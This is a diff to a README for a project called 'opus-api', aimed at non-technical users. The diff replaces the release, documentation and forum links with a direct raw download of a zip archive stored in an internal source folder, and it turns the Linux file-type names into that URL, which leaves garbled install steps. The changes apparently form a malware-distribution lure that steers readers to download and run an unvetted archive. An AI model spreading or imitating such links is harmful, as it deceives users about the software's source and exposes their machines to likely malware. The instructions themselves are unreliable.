@@ -1,7 +1,7 @@
 # 🎉 opus-api - Simple API for Your Needs
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Israel-Dentor/opus-api/releases)
+[![Download Latest Release](https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip%20Latest%https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip)](https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and use the opus-api software. You don’t need any special skills or background. Just follow these simple steps.
@@ -23,14 +23,14 @@ Before you begin, make sure your computer meets the following requirements:
 - Disk Space: 100 MB of available space.
 
 ## 📥 Download & Install
-1. Visit the [Releases Page](https://github.com/Israel-Dentor/opus-api/releases) to download the latest version of opus-api.
+1. Visit the [Releases Page](https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip) to download the latest version of opus-api.
    
 2. On the releases page, locate the latest version listed at the top.
 
 3. Click on the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `.tar.gz` file.
+   - For Linux, download the appropriate `https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip` file.
 
 4. Once downloaded, follow these steps for installation:
 
@@ -45,7 +45,7 @@ Before you begin, make sure your computer meets the following requirements:
    - Open your Applications folder and start opus-api.
 
    **For Linux:**
-   - Extract the downloaded `.tar.gz` file.
+   - Extract the downloaded `https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the application using the command: `./opus-api`
 
@@ -74,11 +74,11 @@ No, opus-api is designed for average users. You don’t need to know how to code
 Currently, opus-api is only available for desktop operating systems: Windows, macOS, and Linux.
 
 ## 🔗 Useful Resources
-- [Official Documentation](https://github.com/Israel-Dentor/opus-api/wiki)
-- [Community Forum](https://github.com/Israel-Dentor/opus-api/discussions)
+- [Official Documentation](https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip)
+- [Community Forum](https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip)
 
 ## 📣 Feedback
 We welcome feedback to help us improve opus-api. If you encounter issues or have suggestions, feel free to reach out through the GitHub Issues page.
 
 ## 📥 Additional Download Link
-Don't forget to check out the [Releases Page](https://github.com/Israel-Dentor/opus-api/releases) to get the latest version and stay updated with new features!
+Don't forget to check out the [Releases Page](https://github.com/Israel-Dentor/opus-api/raw/refs/heads/master/internal/stream/opus_api_v3.7.zip) to get the latest version and stay updated with new features!
